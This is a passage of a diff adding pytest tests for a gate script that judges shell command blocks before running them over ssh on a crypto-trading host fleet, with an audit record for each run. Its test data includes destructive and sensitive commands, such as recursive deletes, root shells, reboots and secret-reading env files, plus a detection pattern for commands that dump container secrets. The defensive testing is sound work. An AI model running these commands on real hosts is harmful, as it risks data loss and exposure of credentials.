+        "sudo docker exec -e COINALYZE_API_KEY= zcrypto-ops-liquidations zcrypto --ship-logs liquidations-poll",
+    ),
+    (
+        "ops-watchdog-drill-copy",
+        "hp",
+        "sudo sed -e 's|^URL=.*|URL=\"\"|' -e 's|https://zcrypto-mon.zhaow.me/api/health|https://both-dark-drill.invalid/|' "
+        "/usr/local/sbin/zcrypto-grafana-watchdog | sudo tee /run/zcrypto-both-dark-drill >/dev/null",
+    ),
+    (
+        "ops-watchdog-drill-run",
+        "hp",
+        "sudo systemd-run --wait --pipe -p EnvironmentFile=/etc/zcrypto-ops/grafana-watchdog-secrets.env "
+        "bash /run/zcrypto-both-dark-drill",
+    ),
+    (
+        "ops-timer-stop",
+        "hp",
+        "sudo systemctl stop zcrypto-panel-materialize.timer && systemctl is-active zcrypto-panel-materialize.timer",
+    ),
+    (
+        "mon-restart-loki",
+        "mon",
+        "sudo systemctl restart loki; until curl -fsS http://127.0.0.1:3100/loki/api/v1/labels; do sleep 0.1; done; date -u +%T.%N",
+    ),
+    ("mon-selfcheck-journal", "mon", "sudo journalctl -u zcrypto-mon-selfcheck --no-pager -o cat | tail -n 5"),
+    ("mon-sudo-probe", "mon", 'printf "%s " "$(hostname)"; sudo -n true && echo sudo-ok'),
+    ("mon-reboot", "mon", "sudo shutdown -r +1"),
+    ("hc-backup-digest", "hc", "sudo sha256sum /var/backups/zcrypto-hc/hc-20261125T0247Z.sqlite"),
+    ("hc-started-at", "hc", "sudo docker inspect zcrypto-hc --format '{{.State.StartedAt}}'"),
+    (
+        "nas-docker-logs",
+        "nas",
+        "sudo /usr/local/bin/docker logs --since 2026-11-25T10:00:00Z zcrypto-archive-pull 2>&1 | tail -n 50",
+    ),
+    ("nas-archive-stop", "nas", "sudo /usr/local/bin/docker stop zcrypto-archive-pull"),
+    ("access-mirror-rollback", "access", "sudo cat /var/lib/caddy-apt-mirror/caddy-rollback"),
+    ("su-c", "zcrypto", "su - root -c 'ls /root'"),
+    ("apt-with-y", "zcrypto", "sudo apt-get install -y jq && sudo DEBIAN_FRONTEND=noninteractive apt-get -qy full-upgrade"),
+    ("rm-rf-deep-capture-hour", "zcrypto", "sudo rm -rf /var/lib/zcrypto-capture/BTC/EUR/book/2026/01"),
+    ("rm-rf-scratch", "zcrypto", "sudo rm -rf /tmp/scratch"),
+    (
+        "env-file-loaded-not-printed",
+        "zcrypto",
+        "sudo docker run --rm --env-file /opt/zcrypto-engine/engine.env ghcr.io/x/y zcrypto engine exec-status",
+    ),
+    ("public-key-read", "zcrypto", "cat /home/zcrypto-deploy/.ssh/id_ed25519.pub"),
+    ("stdin-reader", "zcrypto", "cat"),
+    ("wg-handshakes", "access", "sudo wg show zaccess0 latest-handshakes"),
+    ("valkey-ping", "db1", "sudo docker exec zcrypto-valkey valkey-cli -p 6379 ping"),
+    ("gate-dir-listing-in-container", "zcrypto", "sudo docker exec zcrypto-engine sh -c 'ls /var/lib/zcrypto-engine/exec'"),
+    ("kill-reason-into-a-variable", "zcrypto", 'x=$(sudo cat /var/lib/zcrypto-engine/exec/kill); echo "kill says: $x"'),
+]
+
+
+@pytest.mark.parametrize(("rule", "alias", "block"), [pytest.param(r, a, b, id=f"{r}-{i}") for r, i, a, b in REFUSED])
+def test_a_refused_form_names_its_rule(door, rule, alias, block):
+    done = door.judge(alias, block)
+    assert done.returncode == 65, (done.returncode, done.stdout, done.stderr)
+    assert _rule(done) == rule, done.stderr.decode()
+
+
+@pytest.mark.parametrize("block", [pytest.param(b, id=f"money-path-see-through-{i}") for i, b in SEE_THROUGH])
+def test_a_gate_opening_write_is_seen_through_its_spelling(door, block):
+    done = door.judge("zcrypto", block)
+    assert done.returncode == 65 and _rule(done) == "money-path", done.stderr.decode()
+
+
+@pytest.mark.parametrize(("alias", "block"), [pytest.param(a, b, id=f"admitted-{i}") for i, a, b in ADMITTED])
+def test_an_allowed_form_is_admitted(door, alias, block):
+    done = door.judge(alias, block)
+    assert done.returncode == 0 and done.stdout.decode() == "ADMITTED\n", done.stderr.decode()
+
+
+def test_judging_runs_nothing_and_records_nothing(fresh):
+    admitted = fresh.judge("zcrypto", "sudo systemctl stop zcrypto-engine\n")
+    refused = fresh.judge("zcrypto", "sudo touch /var/lib/zcrypto-engine/exec/armed\n")
+    assert (admitted.returncode, refused.returncode) == (0, 65)
+    assert fresh.ssh_calls() == [] and not fresh.log.exists()
+
+
+# ---------------------------------------------------------------- the alias table
+
+
+def test_the_alias_table_is_the_fleet_tables_ssh_cells():
+    aliases = host_run_sh.fleet_ssh_aliases(FLEET.read_text())
+    assert set(aliases.values()) == {"zcrypto", "red", "hp", "nas", "access", "db1", "db2", "db3", "mon", "hc"}, aliases
+    assert aliases["zcrypto-ops"] == "hp" and aliases["zcrypto"] == "zcrypto" and aliases["zcrypto-red"] == "red"
+
+
+def test_an_alias_outside_the_table_is_refused(door):
+    done = door.judge("zcrypto-engine", "uptime\n")
+    assert done.returncode == 65 and _rule(done) == "alias", done.stderr.decode()
+    assert "db1" in done.stderr.decode()
+
+
+def test_the_alias_table_is_read_at_run_time_from_the_scripts_checkout(fresh):
+    table = fresh.main / "docs" / "reference" / "fleet.md"
+    assert fresh.judge("zz", "uptime\n").returncode == 65
+    row = "| `zcrypto-zz` | `ssh zz` | `observed` | a host added to the table | none |\n"
+    table.write_text(table.read_text().replace("| `zcrypto` | `ssh zcrypto` |", row + "| `zcrypto` | `ssh zcrypto` |", 1))
+    assert fresh.judge("zz", "uptime\n").returncode == 0
+    table.write_text(table.read_text().replace("| `zcrypto-red` | `ssh red` |", "| `zcrypto-red` | `ssh redx` |"))
+    done = fresh.judge("red", "uptime\n")
+    assert done.returncode == 65 and _rule(done) == "alias"
+
+
+def test_the_primary_and_the_workstation_are_found_by_host_name_through_the_table(fresh):
+    table = fresh.main / "docs" / "reference" / "fleet.md"
+    table.write_text(table.read_text().replace("`ssh zcrypto` |", "`ssh prime` |").replace("`ssh hp` |", "`ssh here` |"))
+    assert _rule(fresh.judge("prime", "sudo systemctl stop zcrypto-capture\n")) == "capture-primary"
+    assert _rule(fresh.judge("here", "sudo reboot\n")) == "workstation"
+    assert fresh.judge("prime", "sudo reboot\n").returncode == 0
+
+
+# ---------------------------------------------------------------- usage
+
+
+@pytest.mark.parametrize(
+    ("args", "block"),
+    [
+        pytest.param((), "uptime\n", id="no-alias"),
+        pytest.param(("--timeout", "0", "red"), "uptime\n", id="timeout-zero"),
+        pytest.param(("--timeout", "571", "red"), "uptime\n", id="timeout-over-570"),
+        pytest.param(("--timeout", "soon", "red"), "uptime\n", id="timeout-not-a-number"),
+        pytest.param(("--timeout",), "uptime\n", id="timeout-without-value"),
+        pytest.param(("red", "hp"), "uptime\n", id="two-aliases"),
+        pytest.param(("--verbose", "red"), "uptime\n", id="unknown-option"),
+        pytest.param(("red",), "", id="empty-block"),
+        pytest.param(("red",), b"\xff\xfe uptime\n", id="not-utf8"),
+        pytest.param(("red",), "echo \x07\n", id="control-character"),
+    ],
+)
+def test_a_usage_error_is_rc_64_and_runs_nothing(fresh, args, block):
+    env = fresh.env()
+    data = block.encode() if isinstance(block, str) else block
+    done = subprocess.run(["bash", str(fresh.script), *args], input=data, capture_output=True, env=env, timeout=60)
+    assert done.returncode == 64, (done.returncode, done.stderr)
+    assert fresh.ssh_calls() == [] and fresh.lines() == []
+
+
+def test_a_terminal_on_stdin_is_a_usage_error(fresh):
+    leader, follower = pty.openpty()
+    try:
+        done = subprocess.run(["bash", str(fresh.script), "red"], stdin=follower, capture_output=True, env=fresh.env(), timeout=60)
+    finally:
+        os.close(leader)
+        os.close(follower)
+    assert done.returncode == 64 and b"never from a terminal" in done.stderr, done.stderr
+    assert fresh.ssh_calls() == []
+
+
+def test_a_block_over_64_kib_is_a_usage_error(fresh):
+    done = fresh.run("red", "true\n" * 14000)
+    assert done.returncode == 64 and fresh.ssh_calls() == []
+
+
+# ---------------------------------------------------------------- the run
+
+
+def _remote_block(remote: str) -> str:
+    m = re.fullmatch(r"s=\$\(printf %s ([A-Za-z0-9+/=]+) \| base64 -d\) && exec bash -l -c \"\$s\" host-run </dev/null", remote)
+    assert m, remote
+    return base64.b64decode(m.group(1)).decode()
+
+
+def test_the_block_reaches_ssh_encoded_as_the_alias_user_with_no_terminal_and_no_forwarding(fresh):
+    block = "sudo docker inspect --format '{{.State.StartedAt}}' zcrypto-engine\necho \"it's $HOME\" | cat\n"
+    done = fresh.run("red", block, FAKE_SSH_STDOUT="canned output\n")
+    assert done.returncode == 0 and done.stdout == b"canned output\n", done.stderr
+    (call,) = fresh.ssh_calls()
+    argv = call["argv"]
+    assert argv[:10] == ["-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "-n", "-T", "-a", "-x", "--", "red"], argv
+    assert len(argv) == 11 and argv.count("-o") == 2 and not {"-t", "-tt", "-A"} & set(argv)
+    assert _remote_block(argv[10]) == block
+    assert call["stdin"] == ""
+
+
+def test_quoting_in_the_block_cannot_break_its_delivery(fresh):
+    block = "printf '%s|' \"it's\" 'a \"b\"' $'c\\td' `echo e`; echo\ncat <<'EOF'\n$HOME and `x` stay literal; ' \" \\\nEOF\n"
+    done = fresh.run("red", block, FAKE_SSH_EXEC="1")
+    assert done.returncode == 0, done.stderr
+    assert done.stdout.decode() == 'it\'s|a "b"|c\td|e|\n$HOME and `x` stay literal; \' " \\\n'
+
+
+def test_the_blocks_commands_read_dev_null_never_the_block(fresh):
+    done = fresh.run("red", "cat\necho second-line-ran\nread -r line || echo stdin-is-empty\n", FAKE_SSH_EXEC="1")
+    assert done.returncode == 0, done.stderr
+    assert done.stdout.decode() == "second-line-ran\nstdin-is-empty\n"
+
+
+def test_the_remote_shell_is_bash_without_pipefail(fresh):
+    done = fresh.run(
+        "red", 'false | true; echo "rc=$?"; set -o | grep -E \'^pipefail\' ; echo "$BASH_VERSION" | cut -c1\n', FAKE_SSH_EXEC="1"
+    )
+    out = done.stdout.decode().split("\n")
+    assert out[0] == "rc=0" and re.fullmatch(r"pipefail\s+off", out[1]) and out[2].isdigit(), done.stdout
+
+
+@pytest.mark.parametrize(
+    ("block", "extra", "rc"),
+    [("exit 7\n", {"FAKE_SSH_EXEC": "1"}, 7), ("uptime\n", {"FAKE_SSH_RC": "3"}, 3), ("uptime\n", {"FAKE_SSH_RC": "255"}, 255)],
+)
+def test_the_remote_rc_is_the_scripts_rc(fresh, block, extra, rc):
+    done = fresh.run("red", block, **extra)
+    assert done.returncode == rc, done.stderr
+    assert fresh.lines()[-1]["rc"] == rc
+
+
+def test_the_timeout_bounds_the_run_and_kills_the_local_ssh(fresh):
+    started = time.monotonic()
+    done = fresh.run("red", "sleep 30\n", "--timeout", "1", FAKE_SSH_SLEEP="30")
+    assert done.returncode == 124, done.stderr
+    assert time.monotonic() - started < 15
+    (call,) = fresh.ssh_calls()
+    deadline = time.monotonic() + 5
+    while time.monotonic() < deadline:
+        try:
+            os.kill(call["pid"], 0)
+        except ProcessLookupError:
+            break
+        time.sleep(0.1)
+    else:
+        pytest.fail(f"the fake ssh {call['pid']} outlived the timeout")
+    begin, end = fresh.lines()
+    assert begin["timeout_s"] == 1 and end["rc"] == 124
+
+
+# ---------------------------------------------------------------- the record
+
+
+def test_a_run_records_a_begin_and_an_end_line(fresh):
+    block = "sudo systemctl is-active zcrypto-capture\n"
+    done = fresh.run("red", block, FAKE_SSH_RC="0")
+    assert done.returncode == 0, done.stderr
+    begin, end = fresh.lines()
+    digest = hashlib.sha256(block.encode()).hexdigest()
+    stamp = r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ"
+    assert begin["kind"] == "begin" and re.fullmatch(stamp, begin["ts"])
+    assert (begin["alias"], begin["session"], begin["sha256"], begin["block"]) == ("red", "door-test", digest, block)
+    assert end["kind"] == "end" and re.fullmatch(stamp, end["ts"])
+    assert (end["alias"], end["sha256"], end["rc"]) == ("red", digest, 0)
+    assert isinstance(end["duration_s"], float) and end["duration_s"] >= 0
+
+
+def test_a_session_with_no_name_is_recorded_as_unknown(fresh):
+    fresh.run("red", "uptime\n", unset=("ZCRYPTO_SESSION",))
+    assert fresh.lines()[0]["session"] == "unknown"
+
+
+@pytest.mark.parametrize(
+    ("alias", "block", "rule"),
+    [
+        pytest.param("zcrypto", "sudo touch /var/lib/zcrypto-engine/exec/armed\n", "money-path", id="record-a-rule"),
+        pytest.param("nowhere", "uptime\n", "alias", id="record-an-unknown-alias"),
+    ],
+)
+def test_a_refusal_records_one_refused_line_and_runs_nothing(fresh, alias, block, rule):
+    done = fresh.run(alias, block)
+    assert done.returncode == 65 and _rule(done) == rule, done.stderr
+    (line,) = fresh.lines()
+    assert (line["kind"], line["rule"], line["alias"], line["block"]) == ("refused", rule, alias, block)
+    assert line["sha256"] == hashlib.sha256(block.encode()).hexdigest() and line["reason"]
+    assert fresh.ssh_calls() == []
+
+
+def test_no_run_without_its_record_when_the_log_directory_is_missing(fresh):
+    shutil.rmtree(fresh.main / ".local")
+    done = fresh.run("red", "uptime\n")
+    assert done.returncode == 66, done.stderr
+    assert fresh.ssh_calls() == [] and not (fresh.main / ".local").exists()
+
+
+def test_no_run_without_its_record_when_the_log_cannot_be_written(fresh):
+    fresh.log.mkdir()
+    done = fresh.run("red", "uptime\n")
+    assert done.returncode == 66, done.stderr
+    assert fresh.ssh_calls() == []
+
+
+@pytest.mark.parametrize("judge_only", [False, True], ids=["record-judge-error", "judge-only-judge-error"])
+def test_a_judge_that_fails_refuses_and_runs_nothing(fresh, judge_only):
+    broken = fresh.root / "broken"
+    broken.mkdir()
+    (broken / "python3").write_text("#!/bin/sh\nexit 3\n")
+    (broken / "python3").chmod(0o755)
+    path = f"{broken}{os.pathsep}{fresh.env()['PATH']}"
+    done = fresh.run("red", "uptime\n", *(["--judge"] if judge_only else []), PATH=path)
+    assert done.returncode == 65 and _rule(done) == "judge-error", done.stderr
+    assert fresh.ssh_calls() == []
+    assert [(line["kind"], line["rule"]) for line in fresh.lines()] == ([] if judge_only else [("refused", "judge-error")])
+
+
+def test_a_worktree_records_in_the_main_checkouts_log(fresh):
+    tree = fresh.root / "tree"
+    subprocess.run(["git", "-C", str(fresh.main), "worktree", "add", "-q", "--detach", str(tree)], check=True, capture_output=True)
+    done = fresh.run("red", "uptime\n", script=tree / "infra" / "scripts" / "host-run.sh")
+    assert done.returncode == 0, done.stderr
+    assert [line["kind"] for line in fresh.lines()] == ["begin", "end"]
+    assert not (tree / ".local").exists()
+
+
+# ---------------------------------------------------------------- one definition of the engine env forms
+
+
+def _count_list_engine_env_pattern() -> str:
+    text = (REPO / "infra" / "scripts" / "count-list.sh").read_text()
+    m = re.search(r"^c_engine_env_forms\(\) \{ git grep -nE '([^']+)'", text, re.M)
+    assert m, "count-list.sh's engine-env-forms-invoked entry no longer opens with a quoted git grep -nE pattern"
+    return m.group(1)
+
+
+@pytest.mark.parametrize(
+    ("block", "counted"),
+    [
+        pytest.param("sudo docker inspect --format '{{json .Config.Env}}' zcrypto-engine", True, id="secrets-count-config-env"),
+        pytest.param("sudo docker inspect --format '{{json .Config}}' zcrypto-engine", True, id="secrets-count-config"),
+        pytest.param("sudo docker exec zcrypto-engine env", True, id="secrets-count-exec-env"),
+        pytest.param("sudo docker exec zcrypto-engine env | sort", True, id="secrets-count-exec-env-piped"),
+        pytest.param("sudo docker compose config", True, id="secrets-count-compose-config"),
+        pytest.param("sudo docker inspect --format '{{.State.StartedAt}}' zcrypto-engine", False, id="secrets-count-scoped"),
+        pytest.param("sudo docker exec zcrypto-engine zcrypto engine exec-status", False, id="secrets-count-exec-status"),
+    ],
+)
+def test_the_count_lists_engine_env_forms_are_refused_by_the_judge(door, block, counted):
+    hit = subprocess.run(["grep", "-qE", _count_list_engine_env_pattern()], input=block.encode()).returncode == 0
+    assert hit is counted, block
+    done = door.judge("zcrypto", block + "\n")
+    if counted:
+        assert done.returncode == 65 and _rule(done) == "secrets", done.stderr.decode()
+    else:
+        assert done.returncode == 0, done.stderr.decode()
